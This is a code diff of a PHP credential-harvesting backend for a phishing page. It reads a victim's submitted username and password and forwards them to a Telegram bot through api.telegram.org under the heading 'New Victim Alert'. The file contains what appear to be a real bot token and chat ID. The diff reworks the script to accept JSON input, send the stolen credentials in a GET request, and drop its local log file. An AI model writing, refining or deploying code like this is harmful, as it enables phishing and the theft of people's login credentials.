@@ -1,32 +1,23 @@
 <?php
+header("Content-Type: application/json"); // Set JSON Header
+
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $token = "7632866238:AAFJGMxkD8p18Z8wxnSvf5snHXJN8ZcK9BQ"; // Replace this 🔑
-    $chat_id = "1559369377"; // Replace this 🔑
+    $token = "7632866238:AAFJGMxkD8p18Z8wxnSvf5snHXJN8ZcK9BQ"; // Replace with your bot token
+    $chat_id = "1559369377"; // Replace with your chat ID
 
-    $username = $_POST['username'];
-    $password = $_POST['password'];
+    // Get JSON Data
+    $json = file_get_contents("php://input");
+    $data = json_decode($json, true);
 
-    $message = "🔥 New Victim Alert 🔥\n\nUsername: $username\nPassword: $password\n";
+    $username = htmlspecialchars($data['username']);
+    $password = htmlspecialchars($data['password']);
 
-    $url = "https://api.telegram.org/bot$token/sendMessage";
+    $message = "🔥 New Victim Alert 🔥\n\n<b>Username:</b> $username\n<b>Password:</b> $password";
 
-    $data = json_encode([
-        'chat_id' => $chat_id,
-        'text' => $message,
-        'parse_mode' => 'HTML'
-    ]);
+    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=".urlencode($message)."&parse_mode=HTML";
 
-    $ch = curl_init($url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-    curl_setopt($ch, CURLOPT_POST, 1);
-    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    $response = file_get_contents($url);
 
-    $server_output = curl_exec($ch);
-    curl_close($ch);
-
-    // Logging for Debugging 🔥
-    file_put_contents("log.txt", "Sent: $username | $password\n", FILE_APPEND);
+    echo json_encode(["status" => "success"]);
 }
 ?>
